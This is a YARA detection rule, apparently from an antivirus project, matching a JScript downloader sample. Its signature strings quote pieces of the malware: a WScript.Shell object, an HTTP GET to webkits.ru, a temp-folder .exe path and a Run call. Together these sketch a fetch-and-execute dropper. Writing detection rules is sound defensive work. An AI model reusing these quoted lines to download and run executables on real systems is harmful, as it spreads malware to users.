rule sig_20160330_dbd37a82bf15f2ccdde927dd6ad43ef9 {
  meta:
    description = "datamaliciousorder - file 20160330_dbd37a82bf15f2ccdde927dd6ad43ef9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bdc94c9a5ad862b9ea0d6c35690fd09ecafa7c971cd89dccb76a85e0e915254f"

  strings:
    $s1  = "function H(O0, QL){W = W * 1; return O0 - QL;};" fullword ascii
    $s2  = "var VV = function Q() {return WScript[E](\"WScript\"+\".Shell\");}(), B = 11;" fullword ascii
    $s3  = "R0[BN](\"GET\", \"http://webkits.ru/mn3dka\", false);" fullword ascii
    $s4  = "if (R0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function NB(){return O + \"\";};" fullword ascii
    $s6  = "function KI() {return VV[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0xkXdLDZQsFG3VIL.ex\" + \"e\";};" fullword ascii
    $s7  = "function T0(OQ){VV[\"Run\"](OQ, W, W);};" fullword ascii
    $s8  = "function R() {return ((S0 == true) && (S0 == NQ)) ? 1 : W;};" fullword ascii
    $s9  = "function T()" fullword ascii
    $s10 = "}while (HH);" fullword ascii
    $s11 = "function OZ(){return E;};" fullword ascii
    $s12 = "function DL(EO) {var K = (1, 2, 3, 4, 5, EO); return K;};" fullword ascii
    $s13 = "var XQ = new this[\"Date\"]();" fullword ascii
    $s14 = "return H(Y, P);" fullword ascii
    $s15 = "function NY(){return 22;};" fullword ascii
    $s16 = "var S0 = false;" fullword ascii
    $s17 = "S0 = true; " fullword ascii
    $s18 = "var NQ = false;" fullword ascii
    $s19 = "NQ = true; " fullword ascii
    $s20 = "} catch(Y0){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}